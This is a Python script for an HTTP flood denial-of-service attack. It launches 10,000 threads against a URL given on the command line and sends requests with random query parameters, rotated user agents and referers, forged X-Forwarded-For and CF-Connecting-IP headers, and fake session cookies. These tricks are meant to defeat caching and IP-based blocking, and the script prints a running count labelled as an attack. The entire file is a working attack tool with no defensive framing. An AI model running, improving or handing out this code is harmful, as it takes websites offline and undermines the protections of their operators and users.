import urllib.request
import urllib.error
import sys
import threading
import random
import re
import ipaddress
import time
from datetime import datetime, timedelta

url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
threads = []

isp_blocks = [
    '192.168.0.0/24',
    '10.0.0.0/8',
    '172.16.0.0/12',
]

real_ips = [
    '192.168.0.1',
    '10.0.0.1',
    '172.16.0.1',
]

def generate_spoofed_ip():
    isp_block = random.choice(isp_blocks)
    network = ipaddress.ip_network(isp_block, strict=False)
    spoofed_ip = str(ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1)))
    return spoofed_ip

def generate_real_ip():
    return random.choice(real_ips)

def generate_cookie():
    expires = (datetime.now() + timedelta(days=1)).strftime('%a, %d-%b-%Y %H:%M:%S GMT')
    cookie = f"sessionid=value{random.randint(1, 100000)}; Expires={expires}; Domain={host}; Path=/; Secure; HttpOnly"
    return cookie

def useragent_list():
    with open('useragents.txt', 'r') as f:
        global headers_useragents
        headers_useragents = f.read().splitlines()

def referer_list():
    with open('referers.txt', 'r') as f:
        global headers_referers
        headers_referers = f.read().splitlines()

useragent_list()
referer_list()

def generate_useragent():
    return random.choice(headers_useragents)

def generate_referer():
    return random.choice(headers_referers)

def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str

def inc_counter():
    global request_counter
    request_counter += 1

def stop_attack():
    global flag
    flag = 2

def httpcall(url):
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', generate_useragent())
    request.add_header('Referer', generate_referer() + buildblock(random.randint(5, 10)))
    request.add_header('X-Forwarded-For', generate_spoofed_ip())
    request.add_header('Cookie', generate_cookie())
    request.add_header('CF-Connecting-IP', generate_real_ip())
    try:
        urllib.request.urlopen(request)
    except (urllib.error.HTTPError, urllib.error.URLError):
        pass
    else:
        inc_counter()

class HTTPThread(threading.Thread):
    def run(self):
        while flag < 2:
            httpcall(url)
            time.sleep(random.uniform(0.1, 0.5))

class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) and (previous != request_counter):
                print("%d Requests Sent" % (request_counter))
                previous = request_counter
        if flag == 2:
            print("\n-- Attack stopped by user --")

try:
    if len(sys.argv) < 2:
        print("Usage: script.py <url>")
        sys.exit()
    else:
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('(https?://)?([^/]*)/?.*', url)
        host = m.group(2)
        for i in range(10000):
            t = HTTPThread()
            t.start()
            threads.append(t)
        monitor = MonitorThread()
        monitor.start()
        threads.append(monitor)
except KeyboardInterrupt:
    stop_attack()
    for t in threads:
        t.join()